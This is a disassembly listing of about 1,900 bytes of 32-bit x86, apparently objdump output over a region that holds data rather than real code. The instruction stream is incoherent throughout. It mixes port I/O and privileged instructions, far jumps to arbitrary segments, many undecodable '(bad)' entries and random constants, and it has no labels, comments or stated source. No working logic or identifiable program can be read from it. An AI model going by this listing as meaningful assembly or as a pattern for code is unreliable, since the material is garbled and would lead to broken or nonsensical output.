  4048bc:	mov    al,0xde
  4048be:	mov    ds:0xacbda639,eax
  4048c3:	mov    edi,0x9fbeca52
  4048c8:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4048ca:	cmp    edi,DWORD PTR [eax+0x269320b0]
  4048d0:	in     al,0x57
  4048d2:	cmp    DWORD PTR [eax],edx
  4048d4:	idiv   DWORD PTR [ebp+0x730c1c0d]
  4048da:	jns    0x4048c0
  4048dc:	lods   eax,DWORD PTR ds:[esi]
  4048dd:	cli    
  4048de:	fwait
  4048df:	ror    ch,1
  4048e1:	mov    DWORD PTR [ecx-0x7835bb3a],ecx
  4048e7:	repnz popf 
  4048e9:	add    bh,BYTE PTR [edx]
  4048eb:	pop    es
  4048ec:	inc    eax
  4048ed:	call   0xd529c66f
  4048f2:	mov    dl,bh
  4048f4:	pop    ecx
  4048f5:	in     eax,dx
  4048f6:	sti    
  4048f7:	in     al,dx
  4048f8:	inc    esi
  4048f9:	fs push edi
  4048fb:	adc    ebp,DWORD PTR [ecx+0x374ce360]
  404901:	out    0x7a,al
  404903:	or     cl,dl
  404905:	enter  0xa3ed,0xb4
  404909:	cmp    ah,al
  40490b:	sub    ch,bh
  40490d:	iret   
  40490e:	test   BYTE PTR [edi+edx*8],al
  404911:	mov    ecx,0xd0a46796
  404916:	inc    edi
  404917:	mov    WORD PTR [ecx-0x7df90325],?
  40491d:	inc    eax
  40491e:	mov    esi,0xf4b40aa5
  404923:	jge    0x4048d0
  404925:	retf   
  404926:	popa   
  404927:	xchg   BYTE PTR [ebx+0x750f0024],bh
  40492d:	push   ebp
  40492e:	jecxz  0x4048ba
  404930:	gs mov esp,0x3c298143
  404936:	jnp    0x404929
  404938:	pop    edx
  404939:	sbb    DWORD PTR ds:0x6eac1477,ebx
  40493f:	stos   DWORD PTR es:[edi],eax
  404940:	add    eax,0x23975f7d
  404945:	pop    esp
  404946:	stos   DWORD PTR es:[edi],eax
  404947:	and    ebp,esp
  404949:	fisttp QWORD PTR [eax+0x684390e8]
  40494f:	mov    cl,0x7e
  404951:	jno    0x404936
  404953:	xchg   esi,eax
  404954:	hlt    
  404955:	icebp  
  404956:	in     al,dx
  404957:	lods   al,BYTE PTR ds:[esi]
  404958:	and    DWORD PTR [edi+ecx*2],esi
  40495b:	std    
  40495c:	retf   0x51f2
  40495f:	push   eax
  404960:	mov    dh,0x9b
  404962:	lods   eax,DWORD PTR ds:[esi]
  404963:	fst    DWORD PTR [esi+0x7b]
  404966:	push   es
  404967:	add    BYTE PTR [ebx-0x793f14d6],0x85
  40496e:	add    al,0x85
  404970:	rol    DWORD PTR [edi+0x46cc35c],0x9d
  404977:	mov    cl,0x80
  404979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40497a:	(bad)  
  40497b:	cmp    BYTE PTR [ebx-0x2822ddcf],dh
  404981:	leave  
  404982:	es mov ah,0x8e
  404985:	sub    eax,0xc0d4b6d1
  40498a:	outs   dx,BYTE PTR ds:[esi]
  40498b:	push   0x8595256c
  404990:	jne    0x4049e5
  404992:	idiv   BYTE PTR [eax-0x79]
  404995:	mov    al,ds:0x1739809e
  40499a:	pop    esp
  40499b:	xor    BYTE PTR [ecx+eiz*2],dh
  40499e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40499f:	mov    cl,0xc0
  4049a1:	inc    ebx
  4049a2:	jo     0x404940
  4049a4:	or     DWORD PTR ds:0xbb5edea,esp
  4049aa:	cmc    
  4049ab:	shl    BYTE PTR [esi+eiz*4],1
  4049ae:	shld   esp,ebx,0x11
  4049b2:	fsub   QWORD PTR [eax-0x1b]
  4049b5:	jb     0x40497b
  4049b7:	sub    ah,bl
  4049b9:	inc    edx
  4049ba:	mov    edx,edi
  4049bc:	inc    eax
  4049bd:	test   eax,0xf17bffce
  4049c2:	loop   0x40498e
  4049c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c5:	(bad)  
  4049c8:	shr    BYTE PTR [eax],cl
  4049ca:	jno    0x404a49
  4049cc:	fwait
  4049cd:	dec    edi
  4049ce:	jae    0x4049c7
  4049d0:	mov    ds:0xb3333826,al
  4049d5:	pop    ds
  4049d6:	hlt    
  4049d7:	add    eax,0xcd611c7e
  4049dc:	mov    eax,0x478810da
  4049e1:	jbe    0x4049b8
  4049e3:	mov    eax,ds:0xd581fac3
  4049e8:	stos   DWORD PTR es:[edi],eax
  4049e9:	pop    ebp
  4049ea:	sub    bl,BYTE PTR [ebx+edx*8+0x274ed0d]
  4049f1:	xchg   esi,eax
  4049f2:	(bad)
  4049f6:	aam    0x7a
  4049f8:	sub    BYTE PTR [esi+ecx*4+0x5d],dl
  4049fc:	bound  esp,QWORD PTR [eax]
  4049fe:	xchg   edi,eax
  4049ff:	push   0x6be5037
  404a04:	mov    ds:0xad27fa9d,eax
  404a09:	pop    esi
  404a0a:	jbe    0x404990
  404a0c:	mov    ch,0x9f
  404a0e:	push   ss
  404a0f:	or     eax,0x90d0060d
  404a14:	xor    edx,DWORD PTR [edx-0x6717710a]
  404a1a:	out    dx,al
  404a1b:	jecxz  0x404a04
  404a1d:	sbb    BYTE PTR [ebx],al
  404a1f:	shr    DWORD PTR [esi+0x16],1
  404a22:	sti    
  404a23:	mov    eax,ds:0x197d3b60
  404a28:	inc    edx
  404a29:	pop    es
  404a2a:	inc    esp
  404a2b:	ss sub al,0xb4
  404a2e:	dec    ebp
  404a2f:	adc    al,0xa4
  404a31:	fidivr DWORD PTR [esi+0x2e]
  404a34:	inc    eax
  404a35:	iret   
  404a36:	adc    al,0x40
  404a38:	test   al,0xbc
  404a3a:	out    dx,eax
  404a3b:	xchg   esi,eax
  404a3c:	iret   
  404a3d:	mul    BYTE PTR [ebx+0x26a3322b]
  404a43:	das    
  404a44:	mov    WORD PTR [esi],?
  404a46:	ret    0xe870
  404a49:	mov    gs,WORD PTR [ecx]
  404a4b:	jne    0x404a72
  404a4d:	push   ebx
  404a4e:	pop    es
  404a4f:	gs mov esi,0x7a70849a
  404a55:	cmp    BYTE PTR [esi+0x3e],dh
  404a58:	frstor [ebp-0x69]
  404a5b:	add    al,0xfa
  404a5d:	mov    esi,0xb7cecd05
  404a62:	ins    BYTE PTR es:[edi],dx
  404a63:	adc    DWORD PTR [ebx+0x6cc3eebf],edi
  404a69:	inc    ecx
  404a6a:	jb     0x404a15
  404a6c:	int3   
  404a6d:	and    al,0x83
  404a6f:	sbb    DWORD PTR [eax+0x5b878b79],esp
  404a75:	mov    dh,0xd9
  404a77:	bound  esp,QWORD PTR [esi+0x55eda9d2]
  404a7d:	fsub   DWORD PTR [eax+edi*8]
  404a80:	pop    DWORD PTR [edi-0x591f5f7c]
  404a86:	push   esi
  404a87:	xor    DWORD PTR [edx-0x7b7e0a35],0xfffffff1
  404a8e:	xchg   edx,eax
  404a8f:	pop    ss
  404a90:	adc    bx,0xffb7
  404a94:	stc    
  404a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a96:	push   ebp
  404a97:	scas   al,BYTE PTR es:[edi]
  404a98:	neg    DWORD PTR [edi]
  404a9a:	xchg   DWORD PTR [ecx+0x68],eax
  404a9d:	outs   dx,DWORD PTR ds:[esi]
  404a9e:	and    edi,DWORD PTR [edx]
  404aa0:	mov    esp,0x9772698e
  404aa5:	jbe    0x404a9a
  404aa7:	xor    bl,BYTE PTR [esi]
  404aa9:	dec    edx
  404aaa:	outs   dx,BYTE PTR ds:[esi]
  404aab:	xchg   esp,eax
  404aac:	test   al,0x18
  404aae:	xchg   edx,eax
  404aaf:	ror    dl,0x1c
  404ab2:	pop    ebx
  404ab3:	jmp    0x1656:0x1252317c
  404aba:	repz jg 0x404b38
  404abd:	cmp    ecx,DWORD PTR ss:0xb3b16845
  404ac4:	stos   BYTE PTR es:[edi],al
  404ac5:	sbb    edi,0x53614a33
  404acb:	loope  0x404a80
  404acd:	xchg   ebp,eax
  404ace:	cwde   
  404acf:	mov    eax,ds:0xd313cd7
  404ad4:	push   ebp
  404ad5:	mov    bh,0x24
  404ad7:	and    eax,0x76d0307f
  404adc:	add    ecx,esp
  404ade:	rcl    DWORD PTR [ebx+0x7dc763e0],0xcf
  404ae5:	mov    edx,0x536bd7ba
  404aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aeb:	pop    esi
  404aec:	inc    esp
  404aed:	ds push edx
  404aef:	dec    edx
  404af0:	push   0xca47332d
  404af5:	add    bh,cl
  404af7:	adc    eax,0xe65ad92d
  404afc:	rcr    BYTE PTR [ebp+edx*4-0x7c26cba5],cl
  404b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b04:	push   ebx
  404b05:	hlt    
  404b06:	sub    DWORD PTR [eax],esp
  404b08:	xlat   BYTE PTR ds:[ebx]
  404b09:	push   ecx
  404b0a:	xchg   esi,eax
  404b0b:	push   esp
  404b0c:	mov    ebx,0x95bad335
  404b11:	loope  0x404b0b
  404b13:	push   eax
  404b14:	adc    BYTE PTR [edx+0x6c85556c],ch
  404b1a:	and    edx,0x2f
  404b1d:	and    BYTE PTR [ebx+0x2790c254],bl
  404b23:	popa   
  404b24:	es das 
  404b26:	stos   BYTE PTR es:[edi],al
  404b27:	test   esp,edi
  404b29:	in     al,0x7a
  404b2b:	dec    esp
  404b2c:	adc    DWORD PTR [edi+0x79],esp
  404b2f:	ret    0x496
  404b32:	dec    edi
  404b33:	popf   
  404b34:	icebp  
  404b35:	fisttp QWORD PTR [eax+0x2a]
  404b38:	sbb    eax,edi
  404b3a:	popa   
  404b3b:	dec    ebp
  404b3c:	sub    BYTE PTR [ebx+ebx*1+0xe],0x35
  404b41:	xchg   ecx,eax
  404b42:	xchg   esi,eax
  404b43:	lea    esp,[ebx]
  404b45:	out    dx,eax
  404b46:	xor    eax,0x34f148fd
  404b4b:	(bad)  
  404b4c:	mov    ebx,DWORD PTR [edi-0x1c169447]
  404b52:	inc    esi
  404b53:	dec    esi
  404b54:	int    0x81
  404b56:	jnp    0x404b35
  404b58:	inc    ecx
  404b59:	dec    esp
  404b5a:	xchg   ecx,eax
  404b5b:	and    edx,DWORD PTR [edi+eiz*2]
  404b5e:	imul   esi,DWORD PTR ds:0xb1f01fc4,0xffffffe1
  404b65:	repnz pop edi
  404b67:	(bad)  
  404b68:	(bad)  
  404b69:	jno    0x404b09
  404b6b:	test   eax,0x7c29454b
  404b70:	mov    esp,0x89c3ecfe
  404b75:	(bad)  
  404b76:	out    dx,al
  404b77:	nop
  404b78:	sbb    al,0xe5
  404b7a:	adc    edi,0xffffff8d
  404b7d:	call   0xdd4eb7d4
  404b82:	stc    
  404b83:	mov    BYTE PTR [esi],bh
  404b85:	jp     0x404c00
  404b87:	mov    cl,0x9b
  404b89:	mov    esi,0x774b7005
  404b8e:	mov    bl,0x82
  404b90:	popa   
  404b91:	sub    edx,DWORD PTR es:[esi+0x57dac4a5]
  404b98:	mov    eax,0x776930f3
  404b9d:	jmp    DWORD PTR [ecx+0xa3db64f]
  404ba3:	dec    ebx
  404ba4:	arpl   WORD PTR [edx+0x57],sp
  404ba7:	mov    al,0xac
  404ba9:	popf   
  404baa:	clc    
  404bab:	call   0x9743c454
  404bb0:	xor    BYTE PTR [ebx+0x3e],ch
  404bb3:	cmc    
  404bb4:	lea    ebx,[eax+0xc13263f]
  404bba:	(bad)  
  404bbb:	in     eax,0x7c
  404bbd:	mov    bh,0xb4
  404bbf:	inc    ecx
  404bc0:	sti    
  404bc1:	or     BYTE PTR [eax+0x646844d1],al
  404bc7:	push   eax
  404bc8:	xlat   BYTE PTR ds:[ebx]
  404bc9:	pop    esp
  404bca:	pushf  
  404bcb:	push   es
  404bcc:	addr16 inc esi
  404bce:	lds    ebp,FWORD PTR [edi+0x53937704]
  404bd4:	icebp  
  404bd5:	xchg   ecx,eax
  404bd6:	mov    al,ds:0xe788c536
  404bdb:	iret   
  404bdc:	repnz scas eax,DWORD PTR es:[edi]
  404bde:	sub    BYTE PTR [ecx-0x105c27b0],dh
  404be4:	adc    al,0xb7
  404be6:	sti    
  404be7:	les    ebx,FWORD PTR [ecx-0x5a06b6c4]
  404bed:	fcmovb st,st(0)
  404bef:	push   cs
  404bf0:	daa    
  404bf1:	pop    ds
  404bf2:	mov    ecx,0x7c8973af
  404bf7:	sub    al,0xa5
  404bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bfa:	cli    
  404bfb:	outs   dx,DWORD PTR ds:[esi]
  404bfc:	leave  
  404bfd:	into   
  404bfe:	jbe    0x404c77
  404c00:	push   edx
  404c01:	mov    eax,0x74073ac6
  404c06:	aam    0x17
  404c08:	xchg   esi,eax
  404c09:	std    
  404c0a:	mov    es,WORD PTR [eax+0x5a]
  404c0d:	pushf  
  404c0e:	push   cs
  404c0f:	fsub   DWORD PTR [ebx+0x25]
  404c12:	scas   eax,DWORD PTR es:[edi]
  404c13:	xchg   esp,eax
  404c14:	rcr    bh,1
  404c16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c17:	popf   
  404c18:	sahf   
  404c19:	rcr    BYTE PTR [ebx+0x5ccb1077],0x2f
  404c20:	shl    esi,1
  404c22:	jbe    0x404c60
  404c24:	rol    DWORD PTR [ecx+0x61],1
  404c27:	adc    BYTE PTR [edx+0x45],cl
  404c2a:	xor    bl,BYTE PTR [esi]
  404c2c:	fdivrp st(3),st
  404c2e:	cmp    bl,al
  404c30:	and    eax,esp
  404c32:	sbb    DWORD PTR [eax],ebx
  404c34:	fdiv   QWORD PTR [ebx]
  404c36:	pop    eax
  404c37:	lods   al,BYTE PTR ds:[esi]
  404c38:	mov    DWORD PTR [edx+esi*8],edx
  404c3b:	test   eax,0x1761feeb
  404c40:	clc    
  404c41:	(bad)  
  404c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c43:	cmp    ah,cl
  404c45:	mov    ds:0xf5f27352,al
  404c4a:	and    ecx,DWORD PTR [ebp-0x28868b18]
  404c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c51:	pushf  
  404c52:	jl     0x404c2f
  404c54:	xchg   ebx,eax
  404c55:	or     al,BYTE PTR [esi-0x5b]
  404c58:	imul   ecx,DWORD PTR [eax-0x3894e162],0x1e115224
  404c62:	jp     0x404c12
  404c64:	cs cli 
  404c66:	dec    esp
  404c67:	xor    ch,bl
  404c69:	retf   
  404c6a:	fs dec eax
  404c6c:	outs   dx,BYTE PTR ds:[esi]
  404c6d:	out    0xd6,eax
  404c6f:	pop    edx
  404c70:	stc    
  404c71:	out    dx,al
  404c72:	pop    eax
  404c73:	icebp  
  404c74:	cmp    cl,cl
  404c76:	mov    eax,ds:0x4bc4901b
  404c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c7c:	fs jb  0x404ca4
  404c7f:	mov    gs,edx
  404c81:	jnp    0x404cf2
  404c83:	cdq    
  404c84:	pusha  
  404c85:	xchg   ebp,eax
  404c86:	addr16 pop esp
  404c88:	aaa    
  404c89:	xchg   ebx,eax
  404c8a:	rcr    DWORD PTR [edx],1
  404c8c:	dec    ebp
  404c8d:	aas    
  404c8e:	cmp    al,0x8a
  404c90:	sti    
  404c91:	push   ebx
  404c92:	push   0x1f12bcb6
  404c97:	jae    0x404c2d
  404c99:	inc    edi
  404c9a:	shl    DWORD PTR [ebx],0xfb
  404c9d:	popf   
  404c9e:	push   edi
  404c9f:	shl    DWORD PTR [edi],cl
  404ca1:	in     al,dx
  404ca2:	and    eax,0xe4f756dc
  404ca7:	out    dx,eax
  404ca8:	(bad)  
  404ca9:	nop
  404caa:	imul   ebx,DWORD PTR [edx+0x35],0xffffffc7
  404cae:	mov    cl,0xb3
  404cb0:	ret    0x7e0f
  404cb3:	les    esi,FWORD PTR [edi-0x27b044a0]
  404cb9:	pusha  
  404cba:	addr16 pop ds
  404cbc:	add    BYTE PTR [edx],al
  404cbe:	inc    esp
  404cbf:	add    BYTE PTR [ebx-0x407fbaa8],bh
  404cc5:	mov    bh,0xd2
  404cc7:	(bad)  
  404cc8:	out    0x16,eax
  404cca:	push   esp
  404ccb:	inc    ecx
  404ccc:	out    0x87,al
  404cce:	test   al,ah
  404cd0:	je     0x404c7e
  404cd2:	push   0x35f767e9
  404cd7:	int3   
  404cd8:	repz test eax,0x556186a8
  404cde:	jge    0x404d03
  404ce0:	sbb    DWORD PTR [edi],0xdc1a0bb
  404ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ce7:	jae    0x404d09
  404ce9:	in     eax,0xbb
  404ceb:	dec    edi
  404cec:	pop    ss
  404ced:	repnz (bad) 
  404cef:	adc    ch,BYTE PTR [ebp-0x26]
  404cf2:	jp     0x404cd3
  404cf4:	xchg   esi,eax
  404cf5:	ret    0xa800
  404cf8:	(bad)
  404cfc:	mov    eax,0xe7133605
  404d01:	mov    al,ds:0x9de86ee
  404d06:	fwait
  404d07:	inc    eax
  404d08:	ins    BYTE PTR es:[edi],dx
  404d09:	xchg   ecx,eax
  404d0a:	mov    bl,0xe9
  404d0c:	daa    
  404d0d:	clc    
  404d0e:	inc    ebx
  404d0f:	aad    0xa4
  404d11:	fidivr WORD PTR [esi+0x35]
  404d14:	jmp    0x2ea4:0xab79be4a
  404d1b:	or     edi,edi
  404d1d:	pand   mm3,QWORD PTR [edi+ebp*2]
  404d21:	sub    eax,0x1c0e8cc3
  404d26:	xor    ecx,DWORD PTR ds:0xa974a0db
  404d2d:	jle    0x404d5f
  404d2f:	adc    esi,ebp
  404d31:	push   ebp
  404d32:	jbe    0x404d79
  404d34:	hlt    
  404d35:	enter  0x66ab,0x24
  404d39:	and    DWORD PTR [ecx+edi*2-0x5b],ebx
  404d3d:	scas   al,BYTE PTR es:[edi]
  404d3e:	or     bh,bl
  404d40:	xor    eax,0x19e342ae
  404d45:	in     al,dx
  404d46:	add    al,0x2c
  404d48:	mov    WORD PTR [ecx+0x30267c26],ds
  404d4e:	and    dh,BYTE PTR [edx+0x361ab34f]
  404d54:	ins    BYTE PTR es:[edi],dx
  404d55:	adc    BYTE PTR [esi+edi*8-0x73],al
  404d59:	jmp    0x404dc5
  404d5b:	lahf   
  404d5c:	add    BYTE PTR [ebx],cl
  404d5e:	and    edi,DWORD PTR [esi+0x2b793f2c]
  404d64:	mov    al,cs:0x3296bee7
  404d6a:	leave  
  404d6b:	mov    dl,0x65
  404d6d:	jae    0x404d45
  404d6f:	idiv   BYTE PTR [edx-0x2c624cb7]
  404d75:	mul    DWORD PTR [ecx-0x28]
  404d78:	enter  0xff30,0x6f
  404d7c:	mov    ebx,0xe0484a10
  404d81:	sub    edx,esi
  404d83:	inc    ebx
  404d84:	jmp    DWORD PTR ds:0x155ea4de
  404d8a:	aam    0xb2
  404d8c:	jno    0x404d3c
  404d8e:	mov    edx,0x7d65a79d
  404d93:	mov    esi,0x577c4a89
  404d98:	xlat   BYTE PTR ds:[ebx]
  404d99:	or     ebx,edx
  404d9b:	pop    eax
  404d9c:	cs js  0x404d25
  404d9f:	mov    al,ds:0x929bca
  404da4:	sbb    BYTE PTR [ebp-0x57],0xd1
  404da8:	jmp    0x5c5a:0x9d2e8d41
  404daf:	mov    edx,0x4f41dcab
  404db4:	mov    esi,gs
  404db6:	mov    ebx,0x61573965
  404dbb:	div    DWORD PTR [eax+esi*8+0x6cc1ae7a]
  404dc2:	call   0xa3001b8c
  404dc7:	je     0x404e43
  404dc9:	aaa    
  404dca:	xor    BYTE PTR [eax+0x42],ah
  404dcd:	xor    BYTE PTR [ecx],0x92
  404dd0:	jnp    0x404dea
  404dd2:	mov    edi,0x28405fea
  404dd7:	push   ds
  404dd8:	repz pusha 
  404dda:	inc    ebx
  404ddb:	loope  0x404dce
  404ddd:	cmp    bl,BYTE PTR [esi]
  404ddf:	cmp    ch,bl
  404de1:	imul   eax,DWORD PTR [edi],0xffffffc1
  404de4:	dec    esp
  404de5:	fiadd  WORD PTR [edx-0x24d72229]
  404deb:	pushf  
  404dec:	mov    dl,0xf5
  404dee:	jne    0x404e1a
  404df0:	in     eax,dx
  404df1:	mov    eax,ds:0xd903c012
  404df6:	(bad)  
  404df7:	out    0x67,eax
  404df9:	mov    ah,0x90
  404dfb:	pop    eax
  404dfc:	add    esi,ebp
  404dfe:	xchg   DWORD PTR [ecx-0x7d27e6a5],esi
  404e04:	into   
  404e05:	ss test eax,0xaa2fc513
  404e0c:	pop    ds
  404e0d:	cmovbe esi,edi
  404e10:	fmul   DWORD PTR [edi+ecx*1-0x5c51c06c]
  404e17:	ins    BYTE PTR es:[edi],dx
  404e18:	jo     0x404e61
  404e1a:	fs cmp eax,0xe7afc70e
  404e20:	es push 0x6e
  404e23:	xchg   esi,eax
  404e24:	bound  ebx,QWORD PTR [eax+0xc]
  404e27:	dec    ebx
  404e28:	loope  0x404df2
  404e2a:	adc    BYTE PTR [ebx+0x2ab7cc06],bh
  404e30:	shr    DWORD PTR [eax+eax*1+0x3c393653],1
  404e37:	and    eax,0x46dc4a20
  404e3c:	lock sbb al,0x70
  404e3f:	shl    BYTE PTR [edi-0x4cbb9f57],cl
  404e45:	pmuludq mm4,QWORD PTR [edx+0x3b]
  404e49:	dec    edi
  404e4a:	inc    esp
  404e4b:	mov    BYTE PTR [edi+0x2b],dh
  404e4e:	je     0x404e0a
  404e50:	daa    
  404e51:	div    BYTE PTR [ebx-0x23]
  404e54:	cmp    al,0x71
  404e56:	xchg   esi,eax
  404e57:	and    dl,dh
  404e59:	pop    ebx
  404e5a:	inc    ebp
  404e5b:	repnz push ds
  404e5d:	mov    ah,0x52
  404e5f:	jns    0x404e25
  404e61:	out    dx,eax
  404e62:	je     0x404e59
  404e64:	ins    BYTE PTR es:[edi],dx
  404e65:	fnstsw WORD PTR [ebx-0x5bb8ab76]
  404e6b:	ins    BYTE PTR es:[edi],dx
  404e6c:	xchg   edi,eax
  404e6d:	dec    edi
  404e6e:	mov    esp,0xc6e22a3b
  404e73:	adc    DWORD PTR [ebx+0x1d3d7a8e],esi
  404e79:	xor    bh,BYTE PTR ds:0x3a2f12f1
  404e7f:	les    esp,FWORD PTR [edi]
  404e81:	and    BYTE PTR [ecx+0x3f],0xe0
  404e85:	pop    ebx
  404e86:	fxch   st(6)
  404e88:	xor    BYTE PTR [ecx],al
  404e8a:	in     eax,dx
  404e8b:	repnz popf 
  404e8d:	scas   eax,DWORD PTR es:[edi]
  404e8e:	test   DWORD PTR [ebx-0x43098f64],ecx
  404e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e95:	or     cl,BYTE PTR [ecx+0x8cc48df]
  404e9b:	(bad)  
  404e9c:	(bad)  
  404e9d:	fmul   QWORD PTR [esi]
  404e9f:	leave  
  404ea0:	mov    edx,0xc04ce1c0
  404ea5:	loopne 0x404e69
  404ea7:	dec    edx
  404ea8:	mov    esi,0xd555c9af
  404ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eae:	xchg   edx,eax
  404eaf:	inc    ebp
  404eb0:	mov    fs,WORD PTR [ebp+0x1]
  404eb3:	add    DWORD PTR [ebx+0x55],0xffffff94
  404eb7:	iret   
  404eb8:	sbb    al,0xcd
  404eba:	xor    DWORD PTR ds:0xebfc99a4,edx
  404ec0:	out    dx,eax
  404ec1:	(bad)  
  404ec2:	mov    esi,0x2e66d5b1
  404ec7:	pop    esp
  404ec8:	popf   
  404ec9:	repz leave 
  404ecb:	and    ah,BYTE PTR ds:0x958baf02
  404ed1:	in     eax,dx
  404ed2:	call   0x995c:0xde81a09b
  404ed9:	xor    dl,dh
  404edb:	inc    ebp
  404edc:	jo     0x404ebf
  404ede:	int3   
  404edf:	stos   DWORD PTR es:[edi],eax
  404ee0:	mov    dl,0x78
  404ee2:	mov    WORD PTR [esi+0x5081c00e],ss
  404ee8:	inc    edx
  404ee9:	nop
  404eea:	mov    al,0xf8
  404eec:	aam    0x1
  404eee:	cmc    
  404eef:	clc    
  404ef0:	enter  0x91ed,0x20
  404ef4:	jae    0x404f3d
  404ef6:	test   BYTE PTR [esi-0x2faddd7],bl
  404efc:	pop    ebp
  404efd:	scas   al,BYTE PTR es:[edi]
  404efe:	push   es
  404eff:	ss scas al,BYTE PTR es:[edi]
  404f01:	pusha  
  404f02:	enter  0x139c,0xed
  404f06:	imul   DWORD PTR [ebp+0x5252b773]
  404f0c:	imul   ebp,ebp,0xffffffad
  404f0f:	sahf   
  404f10:	jp     0x404f40
  404f12:	dec    esp
  404f13:	pop    es
  404f14:	cmp    ebp,DWORD PTR [eax-0x67638c0]
  404f1a:	(bad)  
  404f1c:	push   edx
  404f1d:	clc    
  404f1e:	(bad)  
  404f1f:	adc    eax,DWORD PTR [edx-0x47]
  404f22:	mov    dh,0x1c
  404f24:	dec    ebx
  404f25:	clc    
  404f26:	out    0x95,eax
  404f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f29:	aam    0x1c
  404f2b:	pop    edx
  404f2c:	adc    ch,BYTE PTR [ebx]
  404f2e:	mov    ds:0x6f731fb3,eax
  404f33:	push   edi
  404f34:	mov    ds:0xca9c87bc,eax
  404f39:	clc    
  404f3a:	loope  0x404f37
  404f3c:	pop    esp
  404f3d:	test   eax,0x18e32e8e
  404f42:	stc    
  404f43:	sub    eax,0x48c06d11
  404f48:	xor    edi,DWORD PTR [eax+eiz*1]
  404f4b:	or     dl,bh
  404f4d:	mov    eax,ds:0xbc5782fd
  404f52:	test   al,0xd
  404f54:	sbb    cl,al
  404f56:	enter  0x2d3e,0xd2
  404f5a:	dec    esi
  404f5b:	icebp  
  404f5c:	(bad)  
  404f5d:	sbb    BYTE PTR [ecx-0x41],bl
  404f60:	jnp    0x404efb
  404f62:	jg     0x404f6e
  404f64:	push   edi
  404f65:	pop    ebp
  404f66:	inc    esp
  404f67:	mov    ah,0xd5
  404f69:	jae    0x404fac
  404f6b:	push   esi
  404f6c:	push   ebx
  404f6d:	cmp    esi,DWORD PTR [edx+0x66]
  404f70:	js     0x404f32
  404f72:	pop    ebx
  404f73:	or     DWORD PTR [ecx],ebp
  404f75:	aas    
  404f76:	ss pushf 
  404f78:	daa    
  404f79:	mov    ch,0xd3
  404f7b:	test   BYTE PTR [esi+0x9],dl
  404f7e:	xor    BYTE PTR [edx-0xb32b3ee],ah
  404f84:	jae    0x404fe1
  404f86:	or     BYTE PTR [ecx-0x49b4dd35],ch
  404f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f8d:	sub    al,0x1b
  404f8f:	fst    QWORD PTR [edi+edi*4+0x68]
  404f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f94:	sti    
  404f95:	outs   dx,BYTE PTR ds:[esi]
  404f96:	xchg   ebx,eax
  404f97:	or     BYTE PTR [esi+0x5b],bl
  404f9a:	push   ebp
  404f9b:	xchg   BYTE PTR [esi+0x797096d],cl
  404fa1:	jae    0x404f90
  404fa3:	(bad)  
  404fa4:	sti    
  404fa5:	and    edx,DWORD PTR [ecx+edi*8+0x1c]
  404fa9:	pop    ds
  404faa:	push   ebp
  404fab:	jne    0x404fbd
  404fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fae:	ja     0x405012
  404fb0:	cwde   
  404fb1:	lods   al,BYTE PTR ds:[esi]
  404fb2:	pop    ebx
  404fb3:	xor    BYTE PTR [ebp+0x7f],bl
  404fb6:	add    eax,0xa5835bb1
  404fbb:	out    0xdd,al
  404fbd:	mov    edi,0x1fa42e58
  404fc2:	xchg   edx,eax
  404fc3:	jecxz  0x404f6d
  404fc5:	outs   dx,DWORD PTR ds:[esi]
  404fc6:	mov    cl,0xf3
  404fc8:	mov    DWORD PTR [eax-0x2b],esp
  404fcb:	mov    bh,BYTE PTR [esi+0x51]
  404fce:	mov    al,ds:0xb610ed23
  404fd3:	stos   BYTE PTR es:[edi],al
  404fd4:	mov    al,ds:0x765f7c98
  404fd9:	mov    esi,0xbd8b2df5
  404fde:	inc    BYTE PTR [ebx-0x49]
  404fe1:	mov    ch,0x1f
  404fe3:	inc    ebx
  404fe4:	scas   eax,DWORD PTR es:[edi]
  404fe5:	push   es
  404fe6:	sbb    BYTE PTR [ebx-0x68],dh
  404fe9:	pushf  
  404fea:	cmp    BYTE PTR [ecx+0x22],bh
  404fed:	xor    BYTE PTR [di-0x73],al
  404ff1:	mov    edi,0x9b2818b4
  404ff6:	xchg   ebx,eax
  404ff7:	scas   eax,DWORD PTR es:[edi]
  404ff8:	jb     0x404ffa
  404ffa:	(bad)  
  404ffb:	cmp    al,BYTE PTR [esi]
  404ffd:	pushf  
  404ffe:	inc    ecx
  404fff:	not    BYTE PTR [edx+eax*1+0x6c]
  405003:	sub    al,BYTE PTR [eax-0x7d]
  405006:	jg     0x405016
  405008:	inc    cl
  40500a:	outs   dx,DWORD PTR ds:[esi]
  40500b:	xor    BYTE PTR [ebp-0x37],bl
  40500e:	cmp    dh,BYTE PTR [esi-0x9]
  405011:	loop   0x40500d
  405013:	mov    BYTE PTR es:[edi+0x73],cl
  405017:	or     eax,DWORD PTR [ebx+ecx*2-0xb7a8346]
  40501e:	inc    ecx
  40501f:	loope  0x405019
  405021:	stos   DWORD PTR es:[edi],eax
  405022:	adc    al,0x71
  405024:	dec    esi
  405025:	mov    edx,0xb4ef051b
  40502a:	in     al,0xe7
  40502c:	and    al,0xcc
  40502e:	inc    edx
  40502f:	adc    BYTE PTR [edx-0x54b97f1e],0x7e
  405036:	gs pop edx
  405038:	pop    es
  405039:	mov    ebx,0x8a2058b2
  40503e:	xor    al,0x93
  405040:	retf   
  405041:	sbb    al,0xbf
  405043:	mov    edx,0xbdcbaaf8
  405048:	add    DWORD PTR [ebx-0x6d],ecx
